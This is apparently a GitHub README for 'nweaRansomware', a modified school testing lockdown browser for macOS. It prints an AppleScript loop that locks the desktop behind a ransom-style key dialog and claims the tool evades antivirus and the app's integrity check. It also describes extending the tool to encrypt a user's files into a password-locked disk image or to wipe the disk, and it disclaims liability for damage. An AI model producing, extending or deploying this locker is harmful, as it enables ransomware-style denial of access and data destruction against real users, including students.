## About nweaRansomware:
This program is a modified version of the lock down testing browser used for Map testing.
NweaRansomware was built off of was v4.0.0.3.
It will lock the usr's desktop, making it impossible for the user to quit the program without entering the key.
This issue was originally discovered when trying to remove scripts that blocked window switching.

## Public Use: 
This is not avaible to the public for legal reasons, instructions are included on how to use the exploit.

## Live Key:
Emergency Keys(https://www.projectzevo.com/knwea)

## Capabilities:
1. nweaRansomware is capable of more than locking a usr's desktop.
2. During my experimenting, I found it is possible to encrypt a usr's files via disk utility.
This can be done with a couple lines of code that will automate the processes of making a new folder,
moving all desktop files into it, and creating a new disk image with a predetermined password to lock it.
3. It is also possible to run a automated terminal command to wipe the users disk,
erasing all data.
4. These versions of nweaRansomware will not be available to the public

## What has been modified:
Nothing, only eight lines of code have been added.
Code added to "QuitProcesses.applescript":


repeat

	set protectCode to display dialog "!Your laptop is locked! !Enter Key!" default answer "" buttons {"Unlock With Key"}
	
	if text returned of protectCode is "ioZevo#^Github" then
	
		tell application "nwea browser exploited"
		
			quit
			
		end tell
	
	end if
	
end repeat

Sadly NWEA has done a horrible job of securing their code, making it easy to convert their program
into simple Ransomeware. The Sparkle framework, which includes a function to check if code has been
changed, fails to prevent the program from launching.

## Is it detectable by anti-virus programs:
No it is not, no anti-virus has stopped it from running or marked it as malware.
MacOS does not give any warnings, as soon as the application is launched,
the text box asking for a key will appear.

## Terms and Agreements:
When you launch nweaRansomware you agree to the following:
ioZevo(https://github.com/iozevo) is not responsible for anything that
happens to your computer files, hardware, and data. DO NOT contact me for
compensation funds, you will be blocked.

## Bugs:
Usr can still move items around on desktop, but still can not open any apps.

## Safety precautions:
1. Write down the key included in the "key.txt" file on a piece of paper.
   If you enter it correctly, the program will quit.
2. Keep a force-quit tab open to quit it.
3. DO NOT change the name of the program!
4. If all goes wrong do crtl+cmd+pwr-button. Next hold shift down and boot into safe mode to delete the program.

## Downloads:
v4.0.0.3: https://teach.mapnwea.org/contents/partner/Lockdown%20Browser.dmg
